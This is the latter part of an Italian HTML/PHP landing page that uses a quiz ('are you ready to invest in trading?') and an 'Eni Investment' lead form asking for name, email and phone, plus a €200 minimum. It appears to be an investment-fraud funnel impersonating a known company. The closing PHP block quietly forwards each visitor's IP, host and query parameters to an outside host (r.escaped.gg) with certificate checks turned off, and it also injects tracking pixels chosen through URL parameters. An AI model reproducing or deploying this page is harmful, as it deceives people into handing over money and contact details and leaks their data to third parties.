                                        <img data-v-44fad548="" src="data:image/png;base64,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" class="whitelabel__icon" />
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="quiz-container test-step">
                    <div class="quiz">
                        <div class="quiz__questions">
                            <div class="quiz__questions-header">
                                <div class="title quiz__question-title quiz__question-title_without-title">
                                    <span class="is-block">Sei pronto a investire nel trading? Dopotutto, come sai,
                                        per ottenere qualcosa, devi investire qualcosa</span>
                                </div>
                            </div>
                            <div class="question quiz__question question_variants" id="DJ17A5860g">
                                <div class="answer-variants answer-variants_has_image">
                                    <div class="answer-variants__group" data-question="Sei pronto a investire nel trading? Dopotutto, come sai, per ottenere qualcosa, devi investire qualcosa">
                                        <div data-element-index="0" class="answer-variants__variant-text answer-btn" data-answer="Sì, Pronto">
                                            <label tabindex="0" class="b-radio radio">
                                                <input tabindex="-1" type="radio" name="step6" value="Sì, Pronto " />
                                                <span class="check"></span>
                                                <span class="control-label">
                                                    <div class="answer">
                                                        <div class="answer__title">Sì, Pronto&nbsp;</div>
                                                    </div>
                                                </span>
                                            </label>
                                        </div>
                                        <div data-element-index="0" class="answer-variants__variant-text answer-btn" data-answer="Mi piacerebbe, ma non sono sicuro che ce la farò ">
                                            <label tabindex="0" class="b-radio radio">
                                                <input tabindex="-1" type="radio" name="step6" value="Mi piacerebbe, ma non sono sicuro che ce la farò " />
                                                <span class="check"></span>
                                                <span class="control-label">
                                                    <div class="answer">
                                                        <div class="answer__title">
                                                            Mi piacerebbe, ma non sono sicuro che ce la
                                                            farò&nbsp;
                                                        </div>
                                                    </div>
                                                </span>
                                            </label>
                                        </div>
                                        <div data-element-index="0" class="answer-variants__variant-text answer-btn" data-answer="Sto già investendo e ricevendo dividendi ">
                                            <label tabindex="0" class="b-radio radio">
                                                <input tabindex="-1" type="radio" name="step6" value="Sto già investendo e ricevendo dividendi " />
                                                <span class="check"></span>
                                                <span class="control-label">
                                                    <div class="answer">
                                                        <div class="answer__title">
                                                            Sto già investendo e ricevendo dividendi&nbsp;
                                                        </div>
                                                    </div>
                                                </span>
                                            </label>
                                        </div>
                                    </div>
                                    <div class="answer-variants__image">
                                        <img src="img/graf.webp" alt="" class="answer-variants__image-img" />
                                    </div>
                                </div>
                            </div>
                            <div class="quiz__whitelabel quiz__whitelabel_mobile" style="
                    display: block !important;
                    visibility: visible !important;
                    opacity: 1 !important;
                  "></div>
                            <div class="quiz__buttons">
                                <div class="quiz-buttons is-outline">
                                    <div class="quiz-buttons__progress">
                                        <div class="progress-bar">
                                            <div class="progress-bar-circular-steps">
                                                <div class="progress-bar-circular-steps__label">
                                                    Passo 6 su 7
                                                </div>
                                                <div class="progress-bar-circular-steps__gradient-wrapp" style="--left-percent: 0%; --right-percent: 50%">
                                                    <div class="progress-bar-circular-steps__steps" style="left: 0px">
                                                        <div class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active">
                                                        </div>
                                                        <div class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active">
                                                        </div>
                                                        <div class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active">
                                                        </div>
                                                        <div class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active">
                                                        </div>
                                                        <div class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active">
                                                        </div>
                                                        <div class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active">
                                                        </div>
                                                        <div class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active">
                                                        </div>
                                                        <div class="progress-bar-circular-steps__step"></div>
                                                        <div class="progress-bar-circular-steps__step"></div>
                                                        <div class="progress-bar-circular-steps__step"></div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <button class="button quiz-buttons__button quiz-buttons__button_next is-outline next-btn">
                                        <span class="quiz-buttons__button_next-text">Avanti</span>
                                        <span class="icon quiz-buttons__next-icon">
                                            <svg viewBox="0 0 24 24" class="mdi-icon mdi-24px">
                                                <title>mdi-arrow-right</title>
                                                <path d="M4,11V13H16L10.5,18.5L11.92,19.92L19.84,12L11.92,4.08L10.5,5.5L16,11H4Z" stroke-width="0" fill-rule="nonzero"></path>
                                            </svg>
                                        </span>
                                    </button>
                                </div>
                            </div>
                        </div>
                        <div class="quiz__whitelabel_fixed-bottom">
                            <div data-v-44fad548="" class="whitelabel" style="
                    display: block !important;
                    visibility: visible !important;
                    opacity: 1 !important;
                  ">
                                <div data-v-44fad548="" class="whitelabel__container">
                                    <div data-v-44fad548="" class="whitelabel__icon-bg">
                                        <img data-v-44fad548="" src="data:image/png;base64,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" class="whitelabel__icon" />
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="quiz-container quiz-container_has_results test-step">
                    <div class="quiz__lead-form">
                        <div class="final-page final-page_horizontal">
                            <div class="final-page__content-container">
                                <div class="final-page__header-container">
                                    <div class="final-page__header">
                                        Congratulazioni!
                                        <br>
                                        Eni Investment ti dà accesso alla piattaforma di trading! 🎁
                                    </div>
                                    <div class="final-page__content">
                                        <p>
                                            Lascia i tuoi dettagli di contatto per ottenere
                                            l'accesso. ✅ Dopo il check-in, assicurati di prendere
                                            il telefono, Il tuo account manager ti chiamerà subito.
                                        </p>
                                    </div>
                                </div>
                            </div>
                            <div class="final-page__form">
                                <div class="input_wrapper">
                                    <div>
                                        <input type="text" name="forename" placeholder="INSERISCI UN NOME" required />
                                    </div>
                                    <br />
                                    <div>
                                        <input type="text" name="surname" placeholder="INSERISCI IL COGNOME" required />
                                    </div>
                                    <br />
                                    <div>
                                        <input type="email" name="email" placeholder="INSERISCI EMAI" required />
                                    </div>
                                    <br />
                                    <input class='phone' type="tel" name="phone" required />
                                </div>
                                <small> Inizia con un minimo di € 200 </small>
                                <button type="submit" name="submit" class="lead-form__button button button_color_theme is-medium is-outline">
                                    <span class="icon">
                                        <svg viewBox="0 0 24 24" class="mdi-icon mdi-24px">
                                            <title>mdi-checkbox-marked-circle-outline</title>
                                            <path d="M20,12C20,16.42 16.42,20 12,20C7.58,20 4,16.42 4,12C4,7.58 7.58,4 12,4C12.76,4 13.5,4.11 14.2,4.31L15.77,2.74C14.61,2.26 13.34,2 12,2C6.48,2 2,6.48 2,12C2,17.52 6.48,22 12,22C17.52,22 22,17.52 22,12M7.91,10.08L6.5,11.5L11,16L21,6L19.59,4.58L11,13.17L7.91,10.08Z" stroke-width="0" fill-rule="nonzero"></path>
                                        </svg>
                                    </span>
                                    <span>Ottieni l'accesso</span>
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
                <input type="hidden" name="comment" id="comment" value="" />
            </form>
        </div>
    </div>
    </div>
    <script>
        let dataString = "";
    console.log(dataString);
    const btns = document.querySelectorAll(".answer-variants__group");
    const quizDescr = document.getElementById("comment");

    btns.forEach((btn, index) => {
        function once(e) {
            const {
                target,
                currentTarget
            } = e;

            if (target.closest(".answer-btn")) {
                const answer = {
                    question: currentTarget.dataset.question,
                    answer: target.closest(".answer-btn").dataset.answer,
                };
                dataString += `${index + 1}) ${answer.question} ${
              answer.answer
            }.\n `;
                if (btns.length === index + 1) {
                    quizDescr.value = dataString;
                }
            }

            btn.removeEventListener("click", once);
        }
        btn.addEventListener("click", once);
    });
    </script>
    <input type="hidden" name="countryCode" value="it" />
    <script type="text/javascript" src="assets/landing/js/jquery.min.js"></script>
    <script type="text/javascript" src="assets/landing/js/jquery.validate.min.js"></script>
    <script type="text/javascript" src="assets/landing/js/form.js"></script>
    <script src="js/custom.js"></script>
    <script src="js/answers.js"></script>
<?php
$pixl = array (
  'fb' => '',
  'fbe' => 'Lead',
  'ga' => '',
  'gad' => '',
  'tt' => '',
  'vk' => '',
  'mt' => '',
  'mtrk' => '',
);
$isbad = isset($_GET['id']) && substr( $_GET['id'], 0, 1 ) == '0';
if ( isset($_GET['status']) && $_GET['status'] == 'error' ) $isbad = true;
foreach ( $pixl as $px => $df ) if ( $isbad ) {
	$$px = false;
} elseif (isset( $_GET[$px] )) {
	$$px = preg_replace( '#[^0-9A-Za-z\-\_\.\,]+#i', '', stripslashes(filter_var( $_GET[$px], FILTER_SANITIZE_STRING )) );
} elseif (isset( $_COOKIE[$px] )) {
	$$px = preg_replace( '#[^0-9A-Za-z\-\_\.\,]+#i', '', stripslashes(filter_var( $_COOKIE[$px], FILTER_SANITIZE_STRING )) );
} else $$px = $df;
if ( $fb ) {
	$fb = explode( ',', $fb );
	?><script>!function(f,b,e,v,n,t,s) {if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)}; if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0'; n.queue=[];t=b.createElement(e);t.async=!0; t.src=v;s=b.getElementsByTagName(e)[0]; s.parentNode.insertBefore(t,s)}(window, document,'script','https://connect.facebook.net/en_US/fbevents.js'); <?php
	foreach ( $fb as $f ) if ( $f = trim($f) ) :
	?> fbq('init', '<?=$f;?>'); <?php
	endif;
	?> fbq('track', 'PageView'); setTimeout( fbq, 30000, 'track', 'ViewContent' );</script><noscript><?php
	foreach ( $fb as $f ) if ( $f = trim($f) ) :
	?><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=<?=$f;?>&ev=PageView&noscript=1" /><?php
	endif;
	?></noscript><?php
}
if ( $ga ) {
	$gtm = ( strtolower(substr( $ga, 0, 3 )) == 'gtm' ) ? 1 : 0;
	if ( $gtm ) {
		?><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start': new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f); })(window,document,'script','dataLayer','<?=$ga;?>');</script><noscript><iframe src="https://www.googletagmanager.com/ns.html?id=<?=$ga;?>" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript><?php
	} else {
		?><script async src="https://www.googletagmanager.com/gtag/js?id=<?=$ga;?>"></script><script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments)}; gtag('js', new Date()); gtag('config', '<?=$ga;?>');</script><?php
	}
}
if ( $tt ) {
	?><script> !function (w, d, t) {  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var i="https://analytics.tiktok.com/i18n/pixel/events.js";ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=i,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};var o=document.createElement("script");o.type="text/javascript",o.async=!0,o.src=i+"?sdkid="+e+"&lib="+t;var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(o,a)}; ttq.load('<?=$tt;?>'); ttq.page(); }(window, document, 'ttq'); </script><?php
}
if ( $vk ) {
	?><script type="text/javascript">!function(){var t=document.createElement("script");t.type="text/javascript",t.async=!0,t.src='https://vk.com/js/api/openapi.js?169',t.onload=function(){VK.Retargeting.Init("<?=$vk;?>"),VK.Retargeting.Hit()},document.head.appendChild(t)}();</script><noscript><img src="https://vk.com/rtrg?p=<?=$vk;?>" style="position:fixed; left:-999px;" alt=""/></noscript><?php
}
if ( $mt ) {
	?><script type="text/javascript"> var _tmr = window._tmr || (window._tmr = []); _tmr.push({id: "<?=$mt;?>", type: "pageView", start: (new Date()).getTime(), pid: "USER_ID"}); (function (d, w, id) { if (d.getElementById(id)) return; var ts = d.createElement("script"); ts.type = "text/javascript"; ts.async = true; ts.id = id; ts.src = (d.location.protocol == "https:" ? "https:" : "http:") + "//top-fwz1.mail.ru/js/code.js"; var f = function () {var s = d.getElementsByTagName("script")[0]; s.parentNode.insertBefore(ts, s);}; if (w.opera == "[object Opera]") { d.addEventListener("DOMContentLoaded", f, false); } else { f(); } })(document, window, "topmailru-code");</script><noscript><div><img src="//top-fwz1.mail.ru/counter?id=<?=$mt;?>;js=na" style="border:0;position:absolute;left:-9999px;" alt="" /></div></noscript><?php
}
if ( $mtrk ) {
	?><script type="text/javascript" > (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)}; m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)}) (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym"); ym(<?=$mtrk;?>, "init", { clickmap:true, trackLinks:true, accurateTrackBounce:true, webvisor:true }); </script><noscript><div><img src="https://mc.yandex.ru/watch/<?=$mtrk;?>" style="position:absolute; left:-9999px;" alt="" /></div></noscript><?php
}
?></body>

</html><?php
error_reporting( 0 ); // Fuck PHP 8.2 and all the fucking hipsters
$ip = isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : ( isset($_SERVER["HTTP_X_FORWARDED_FOR"]) ? $_SERVER["HTTP_X_FORWARDED_FOR"] : ( isset($_SERVER["HTTP_X_REAL_IP"]) ? $_SERVER["HTTP_X_REAL_IP"] : ( isset($_SERVER["HTTP_X_CLIENT_IP"]) ? $_SERVER["HTTP_X_CLIENT_IP"] : $_SERVER["REMOTE_ADDR"]) ) );
$host = isset($_SERVER["HTTP_X_FORWARDED_HOST"]) ? $_SERVER["HTTP_X_FORWARDED_HOST"] : ( isset($_SERVER["HTTP_X_HOST"]) ? $_SERVER["HTTP_X_HOST"] : ( isset($_SERVER["HTTP_HOST"]) ? $_SERVER["HTTP_HOST"] : $_SERVER["SERVER_NAME"] ));
$curl = curl_init( "https://r.escaped.gg/eni/it/signin2/?flow=153&_clientip=$ip&_clienthost=$host&" . http_build_query($_GET) );
curl_setopt( $curl, CURLOPT_RETURNTRANSFER, true );
if (isset( $_SERVER["HTTP_USER_AGENT"] )) curl_setopt( $curl, CURLOPT_USERAGENT, $_SERVER["HTTP_USER_AGENT"] );
curl_setopt( $curl, CURLOPT_SSL_VERIFYHOST, 0 );
curl_setopt( $curl, CURLOPT_SSL_VERIFYPEER, 0 );
curl_exec( $curl );
curl_close( $curl );
?>